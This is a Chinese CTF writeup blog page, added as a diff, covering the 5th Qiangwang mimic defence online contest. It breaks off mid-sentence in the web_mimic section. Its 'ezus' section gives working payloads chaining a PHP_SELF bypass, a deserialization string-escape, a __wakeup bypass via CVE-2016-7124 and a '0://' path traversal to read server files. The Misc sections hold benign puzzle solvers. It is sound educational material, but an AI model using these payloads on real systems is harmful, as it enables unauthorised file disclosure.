@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="PwnIO">
+
+
+
+
+
+<title>第五届“强网”拟态防御（线上赛）Writeup | Pwnio.com</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Pwnio&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Pwnio&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">第五届“强网”拟态防御（线上赛）Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">PwnIO</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2022-11-07&nbsp;&nbsp;17:52:59</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezus"><a href="#ezus" class="headerlink" title="ezus"></a>ezus</h2><p>访问index.php，可以得到源码链接，点进去后可以看到index.php源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;tm.php&#x27;</span>; <span class="comment">// Next step in tm.php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/tm\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;no way!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/tm.php$/&#x27;</span>, <span class="variable">$path</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/index.php$/&#x27;</span>, <span class="variable">$path</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;index.php?source&quot;</span>&gt;source&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此处可以使用特殊字符（%C3%A9）绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/index.php/étm.php/é?source</span><br></pre></td></tr></table></figure>
+<p>得到tm.php源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span>, <span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;f = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//something in hint.php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;hint != <span class="string">&quot;pass&quot;</span> || <span class="variable language_">$this</span>-&gt;f != <span class="string">&quot;pass&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;f = <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$this</span>-&gt;hint, FILTER_VALIDATE_URL))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;f)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;f, <span class="string">&quot;try&quot;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;f, <span class="string">&quot;pass&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    @<span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;f . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prankhub$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$out</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>.<span class="variable">$out</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;&lt;br/&gt;error&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;try it!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)))));</span><br></pre></td></tr></table></figure>
+<p>此步需要绕过的点：</p>
+<ol>
+<li>object_sleep和object_weakup两个函数会对chr(0).&#39;*&#39;.chr(0)进行替换和还原，看似没改变原字符串，但是如果输入的就是“@0@0@0@”，则会被替换成chr(0).&#39;*&#39;.chr(0)，长度由7个字符变为3个字节，减少4个字节。因此可以在反序列化的时候，往username里塞适量的@0@0@0@，让username溢出读取后面password序列化值的部分内容，也就可以控制反序列化用的字符串，往UserAccount中多塞个order类型的成员变量，进而触发__destruct内容。<br>可以参考：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_43645782/article/details/105801796</span><br><span class="line">https://www.cnblogs.com/MisakaYuii-Z/p/12781055.html</span><br></pre></td></tr></table></figure></li>
+<li>正常情况下，wakeup方法会在destruct之前执行，因此需要绕过order类中的__wakeup方法。此处利用CVE-2016-7124漏洞。<br>可以参考：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://access.redhat.com/security/cve/CVE-2016-7124</span><br><span class="line">https://www.cnblogs.com/xhds/p/12243760.html</span><br></pre></td></tr></table></figure></li>
+<li>需要绕过filter_var函数和host检测，此处file_get_contents函数，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。因此，0://prankhub/形式会被认为是一个目录，使用0://prankhub/../../../var/www/html/hint.php即可读取hint.php文件。<br>此处推荐一篇好文：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=zzzzzz@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;password=1234&quot;;s:2:&quot;ts&quot;;O:5:&quot;order&quot;:3:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:49:&quot;0://prankhub/../../../../../var/www/html/hint.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后根据hint.php里的提示，再次读取/f1111444449999.txt文件，即可得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=zzzzzz@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;password=1234&quot;;s:2:&quot;ts&quot;;O:5:&quot;order&quot;:3:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:46:&quot;0://prankhub/../../../../../f1111444449999.txt&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="S3qUenCEs"><a href="#S3qUenCEs" class="headerlink" title="S3qUenCEs"></a>S3qUenCEs</h2><p>很欣慰能在CTF中看到ACM题:D<br>直接nc怼过去，可得题目描述：</p>
+<blockquote>
+<p>You are given an array a consisting n(1=&lt;n&lt;=10^6) integers a1,a2,…,an(-10^9&lt;=ai&lt;=10^9 for each 1&lt;=i&lt;=n) and an integer k(1&lt;=k&lt;=n).<br>You can do any number of operations.In each option you can choose an interval [l,r] with a length of k and multiply the number al,al+1,…ar in array a by -1.You have to output the maximum value of the sum of the array a after any number of options.</p>
+<p>You need to answer 100 independent questions.Each question has a time limit of 5 seconds.</p>
+<p>Each question just like this:</p>
+<p>Input:<br>5 3<br>3 4 -3 7 -6</p>
+<p>Output:<br>17</p>
+</blockquote>
+<p>大意是给你n、k和一个长度为n的整数数组，你一次可以翻转（由负变正或由正变负）数组中的连续k个元素，求在无限次翻转的情况，数组所有元素和的最大值。</p>
+<p>考虑数据范围10^6，因此肯定是O(n)时间复杂度的算法了。</p>
+<p>思路：</p>
+<ol>
+<li><p>按照元素下标模k分组，那么每个组里的任意两个数都能在不影响数组中其它n-2个数同时，进行翻转。</p>
+</li>
+<li><p>因此每个组翻转到最优情况时，最多一个负数（原来有奇数个负数）或没有负数（原来有偶数个负数）。</p>
+</li>
+<li><p>因此某个组若负数有奇数个，则取这个组绝对值最小的数做负数。否则这个组全部取正数。此时结果最优。</p>
+</li>
+<li><p>经过上述后，得到一个结果。翻转数组前k个数，改变每个组的负数个数奇偶性，再重复一次。取两次值的最大值，即为结果。</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> inf</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_half</span>(<span class="params">arr: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    n = <span class="built_in">len</span>(arr)</span><br><span class="line">    group_na_cnt = [<span class="number">0</span>] * k <span class="comment"># 每组负数个数</span></span><br><span class="line">    group_sum = [<span class="number">0</span>] * k <span class="comment"># 每组的绝对值和</span></span><br><span class="line">    group_min = [inf] * k <span class="comment"># 每组最小的数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        x = i % k</span><br><span class="line">        <span class="keyword">if</span> arr[i] &lt; <span class="number">0</span>:</span><br><span class="line">            group_na_cnt[x] += <span class="number">1</span></span><br><span class="line">        group_sum[x] += <span class="built_in">abs</span>(arr[i])</span><br><span class="line">        group_min[x] = <span class="built_in">min</span>(group_min[x], <span class="built_in">abs</span>(arr[i]))</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        <span class="keyword">if</span> group_na_cnt[j] % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            ans += group_sum[j]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans += group_sum[j] - <span class="number">2</span> * group_min[j]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">ori: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    arr = ori.copy()</span><br><span class="line">    ans1 = solve_half(arr, k)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        arr[i] = -arr[i]</span><br><span class="line">    ans2 = solve_half(arr, k)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(ans1, ans2)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;172.52.x.x&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">z = <span class="number">100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(z):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Challenge Input:\n&#x27;</span>)</span><br><span class="line">    nk = p.recvline(keepends=<span class="literal">False</span>).decode()</span><br><span class="line">    arrstr = p.recvline(keepends=<span class="literal">False</span>).decode()</span><br><span class="line">    k = <span class="built_in">int</span>(nk.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    arr = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> arrstr.split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line">    res = <span class="built_in">str</span>(solve(arr, k))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Give me your output:\n&#x27;</span>)</span><br><span class="line">    p.sendline(res.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;#&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">flag = p.recvall()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="babymisc"><a href="#babymisc" class="headerlink" title="babymisc"></a>babymisc</h2><p>猜数字游戏，范围是6位数字（100000 - 999999）。每次提交一个整数，服务端会返回up或low，即你给的数大于或者小于这个数字。<br>二分查找，但只能输15次左右，二分次数不太够。写个程序循环多尝试几轮，运气好可以猜中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.52.x.x&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">    left = <span class="number">100000</span></span><br><span class="line">    right = <span class="number">999999</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Please enter a number:&#x27;</span>)</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        p.sendline(<span class="built_in">str</span>(mid))</span><br><span class="line">        r = p.recvline(keepends=<span class="literal">False</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> r.strip() == <span class="string">&#x27;low&#x27;</span>:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">elif</span> r.strip() == <span class="string">&#x27;up&#x27;</span>:</span><br><span class="line">            right = mid         </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(r)</span><br><span class="line">            <span class="keyword">if</span> r != <span class="string">&#x27;You lost&#x27;</span>:</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="MIMIC"><a href="#MIMIC" class="headerlink" title="MIMIC"></a>MIMIC</h1><h2 id="web-mimic"><a href="#web-mimic" class="headerlink" title="web_mimic"></a>web_mimic</h2><p>网页源代码里，可以看到两个串：</p>
+<p><img src="/2022/02424817df98/20221107_001.jpg" alt="网页源码"></p>
+<p>NTLM串在CMD5上可以查到结果123。下面那串16进制值，使用算法DES，密钥123解密后得到提示：</p>
